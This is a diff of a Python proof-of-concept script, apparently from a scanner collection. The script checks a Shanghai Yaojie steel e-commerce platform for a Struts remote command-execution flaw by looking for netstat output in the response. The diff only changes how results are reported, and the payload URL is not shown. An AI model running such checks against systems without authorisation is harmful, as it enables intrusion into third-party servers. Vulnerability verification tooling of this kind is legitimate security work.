@@ -8,8 +8,8 @@ description: 上海垚捷公司的钢材电商平台存在通用性struts漏洞,
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class yaojie_steel_struts_exec_BaseVerify:
     def __init__(self, url):
@@ -24,21 +24,21 @@ class yaojie_steel_struts_exec_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"Active Internet connections" in req.text:
-                cprint("[+]存在垚捷电商平台struts 命令执行漏洞...(高危)\tpayload: "+vulnurl+"\t[Linux]", "red")
+                return "[+]存在垚捷电商平台struts 命令执行漏洞...(高危)\tpayload: "+vulnurl+"\t[Linux]"
 
             elif r"Active Connections" in req.text or r"活动连接" in req.text:
-                cprint("[+]存在垚捷电商平台struts 命令执行漏洞...(高危)\tpayload: "+vulnurl+"\t[Windows]", "red")
+                return "[+]存在垚捷电商平台struts 命令执行漏洞...(高危)\tpayload: "+vulnurl+"\t[Windows]"
 
             elif r"LISTEN" in req.text:
-                cprint("[+]可能存在垚捷电商平台struts 命令执行漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]可能存在垚捷电商平台struts 命令执行漏洞...(高危)\tpayload: "+vulnurl
 
             else:
                 pass
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = yaojie_steel_struts_exec_BaseVerify(sys.argv[1])
     testVuln.run()
